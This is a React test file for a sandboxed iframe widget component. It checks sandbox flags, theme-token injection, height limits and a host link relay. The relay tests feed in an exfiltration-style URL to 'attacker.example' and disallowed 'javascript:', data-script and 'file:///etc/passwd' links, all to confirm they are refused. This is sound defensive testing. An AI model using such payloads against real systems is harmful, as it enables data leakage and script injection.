import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { cleanup, render, waitFor } from "@testing-library/react";
import { renderToStaticMarkup } from "react-dom/server";
import { MemoryRouter } from "react-router";

import { VisualSurface } from "@/domains/chat/components/surfaces/visual-surface";
import type { Surface } from "@/domains/chat/types/types";

function surface(data: Record<string, unknown>, title?: string): Surface {
  return {
    surfaceId: "surface-visual-1",
    surfaceType: "visual",
    display: "inline",
    title,
    data,
  } as Surface;
}

/** `useNavigate` needs router context; effects don't run under
 *  `renderToStaticMarkup`, so this exercises the initial srcdoc only. */
function renderSurface(s: Surface): string {
  return renderToStaticMarkup(
    <MemoryRouter>
      <VisualSurface surface={s} />
    </MemoryRouter>,
  );
}

function applyTokens(css: string): void {
  const style = document.createElement("style");
  style.textContent = css;
  document.head.appendChild(style);
}

afterEach(() => {
  cleanup();
  document.documentElement.removeAttribute("data-theme");
  for (const style of Array.from(document.head.querySelectorAll("style"))) {
    style.remove();
  }
});

describe("VisualSurface", () => {
  test("renders a sandboxed iframe carrying the widget HTML", () => {
    // GIVEN a visual surface with widget markup
    const rendered = renderSurface(
      surface({ html: "<div>widget body</div>" }, "A diagram"),
    );

    // THEN the iframe is sandboxed without same-origin access and referrer-free
    expect(rendered).toContain("<iframe");
    expect(rendered).toContain('sandbox="allow-scripts"');
    expect(rendered).not.toContain("allow-same-origin");
    // …and without popup tokens: a popup is a top-level navigation, which the
    // embedder's `frame-src` cannot constrain, so it would be an egress
    // channel out of a document that is otherwise denied all network access.
    expect(rendered).not.toContain("allow-popups");
    expect(rendered).toContain('referrerPolicy="no-referrer"');
    expect(rendered).toContain('title="A diagram"');
    // …and srcdoc carries the widget markup (HTML-escaped inside the attribute)
    expect(rendered).toContain("&lt;div&gt;widget body&lt;/div&gt;");
  });

  test("injects the host design tokens and base styles into srcdoc", () => {
    // GIVEN the host document resolving brand tokens
    applyTokens(
      ':root{--surface-lift:#ffffff;--content-default:#24292e;--font-sans:"DM Sans", system-ui;}',
    );

    // WHEN the surface renders
    const rendered = renderSurface(surface({ html: "<div>widget</div>" }));

    // THEN the resolved values ride along so the widget matches the app theme
    expect(rendered).toContain("--surface-lift:#ffffff;");
    expect(rendered).toContain("--content-default:#24292e;");
    expect(rendered).toContain("background:transparent");
    expect(rendered).toContain("font-family:var(--font-sans)");
    // The widget declares the host's color scheme so its scrollbars and form
    // controls match rather than defaulting to light.
    expect(rendered).toContain("color-scheme:light");
  });

  test("re-snapshots the tokens under the host's dark theme", () => {
    // Client render, not SSR: the theme comes off the live `data-theme`
    // attribute, which `renderToStaticMarkup` cannot observe.
    document.documentElement.setAttribute("data-theme", "dark");
    applyTokens(":root{--content-default:#f6f5f4;}");

    const { container } = render(
      <MemoryRouter>
        <VisualSurface surface={surface({ html: "<div>widget</div>" })} />
      </MemoryRouter>,
    );

    const srcdoc = container.querySelector("iframe")?.getAttribute("srcdoc");
    expect(srcdoc).toContain("color-scheme:dark");
    expect(srcdoc).toContain("--content-default:#f6f5f4;");
  });

  test("injects the widget bridge but not the app fetch proxy", () => {
    const rendered = renderSurface(surface({ html: "<div>widget</div>" }));

    expect(rendered).toContain("vellum_widget_height");
    expect(rendered).toContain("window.sendPrompt");
    expect(rendered).toContain("storageShim");
    expect(rendered).not.toContain("vellum_fetch_request");
  });

  test("uses the surface height, clamped to the widget bounds", () => {
    expect(renderSurface(surface({ html: "<i></i>", height: 520 }))).toContain(
      "height:520px",
    );
    // Below the floor and above the ceiling both clamp.
    expect(renderSurface(surface({ html: "<i></i>", height: 10 }))).toContain(
      "height:80px",
    );
    expect(renderSurface(surface({ html: "<i></i>", height: 9000 }))).toContain(
      "height:1400px",
    );
    // No declared height falls back to the default.
    expect(renderSurface(surface({ html: "<i></i>" }))).toContain(
      "height:300px",
    );
  });

  test("re-reads the design tokens when the host stylesheet applies after mount", async () => {
    // GIVEN a widget that mounts before the app's stylesheet has applied, so
    // every token resolves to the empty string
    const { container } = render(
      <MemoryRouter>
        <VisualSurface surface={surface({ html: "<div>widget</div>" })} />
      </MemoryRouter>,
    );
    const initialFrame = container.querySelector("iframe");
    expect(initialFrame?.getAttribute("srcdoc")).toContain(
      ":root{color-scheme:light;}",
    );
    expect(initialFrame?.getAttribute("srcdoc")).not.toContain(
      "--content-default:#24292e",
    );

    // WHEN the host's tokens land
    applyTokens(":root{--content-default:#24292e;}");

    // THEN the snapshot is re-read and the frame remounts with a themed
    // document, rather than keeping the token-less one forever (nothing else
    // invalidates it — the theme never changed and the font snapshot can
    // resolve to the same empty string it started at).
    await waitFor(() => {
      expect(
        container.querySelector("iframe")?.getAttribute("srcdoc"),
      ).toContain("--content-default:#24292e;");
    });
    expect(container.querySelector("iframe")).not.toBe(initialFrame!);
  });

  test("remounts the frame whenever the injected document changes", async () => {
    // The frame is keyed on the whole `srcdoc`, not on the widget markup alone:
    // React reuses an iframe element across `srcDoc` changes and a reused frame
    // keeps the previous document's state, so any change to what is injected
    // (markup, theme tokens, inlined fonts) has to mint a new element.
    applyTokens(":root{--content-default:#24292e;}");
    const { container, rerender } = render(
      <MemoryRouter>
        <VisualSurface surface={surface({ html: "<div>one</div>" })} />
      </MemoryRouter>,
    );
    const first = container.querySelector("iframe");

    rerender(
      <MemoryRouter>
        <VisualSurface surface={surface({ html: "<div>two</div>" })} />
      </MemoryRouter>,
    );
    const second = container.querySelector("iframe");
    expect(second).not.toBe(first!);
    expect(second?.getAttribute("srcdoc")).toContain("<div>two</div>");
  });

  test("renders nothing when the surface carries no HTML", () => {
    expect(renderSurface(surface({}))).toBe("");
    expect(renderSurface(surface({ html: "" }))).toBe("");
    expect(renderSurface(surface({ html: 42 }))).toBe("");
  });
});

describe("VisualSurface link relay", () => {
  const originalOpen = window.open;
  let opened: string[];

  /** Mount the surface and hand back its frame, so a relayed message can
   *  carry the `source` the parent checks. */
  function mountFrame(): HTMLIFrameElement {
    const { container } = render(
      <MemoryRouter>
        <VisualSurface surface={surface({ html: "<div>widget</div>" })} />
      </MemoryRouter>,
    );
    const frame = container.querySelector("iframe");
    if (!frame) {
      throw new Error("expected the visual surface to render a frame");
    }
    return frame;
  }

  function relayLink(frame: HTMLIFrameElement, href: unknown): void {
    const event = new MessageEvent("message", {
      data: { type: "vellum_open_link", frameId: "surface-visual-1", href },
    });
    // `source` is readonly on the constructed event, and happy-dom does not
    // honour it from the init dict.
    Object.defineProperty(event, "source", { value: frame.contentWindow });
    window.dispatchEvent(event);
  }

  function setUserActivation(isActive: boolean): void {
    Object.defineProperty(navigator, "userActivation", {
      value: { isActive, hasBeenActive: isActive },
      configurable: true,
    });
  }

  beforeEach(() => {
    opened = [];
    window.open = ((url?: string | URL) => {
      opened.push(String(url));
      return null;
    }) as typeof window.open;
    setUserActivation(true);
  });

  afterEach(() => {
    window.open = originalOpen;
  });

  test("opens a relayed external link on the host", () => {
    // GIVEN a widget whose link click was relayed rather than opened in-frame
    const frame = mountFrame();

    // WHEN the relay arrives under an active user activation
    relayLink(frame, "https://example.com/docs");

    // THEN the host opens it, so Electron and Capacitor route it through their
    // own external-browser handling instead of the sandbox opening it raw.
    expect(opened).toEqual(["https://example.com/docs"]);
  });

  test("ignores a relay with no user activation", () => {
    // A widget reads its own frameId and can post on load or in a loop, so the
    // click is the only thing separating a link the user asked for from markup
    // phoning home.
    const frame = mountFrame();
    setUserActivation(false);

    relayLink(frame, "https://attacker.example/leak?d=secret");

    expect(opened).toEqual([]);
  });

  test("refuses schemes outside the link allowlist", () => {
    const frame = mountFrame();

    for (const href of [
      "javascript:alert(1)",
      "data:text/html,<script>x</script>",
      "file:///etc/passwd",
      "blob:https://example.com/abc",
    ]) {
      relayLink(frame, href);
    }

    expect(opened).toEqual([]);
  });

  test("ignores a relay from anything but its own frame", () => {
    const frame = mountFrame();
    const event = new MessageEvent("message", {
      data: {
        type: "vellum_open_link",
        frameId: "surface-visual-1",
        href: "https://attacker.example/leak",
      },
    });
    Object.defineProperty(event, "source", { value: window });
    window.dispatchEvent(event);

    expect(opened).toEqual([]);
    expect(frame).toBeTruthy();
  });
});
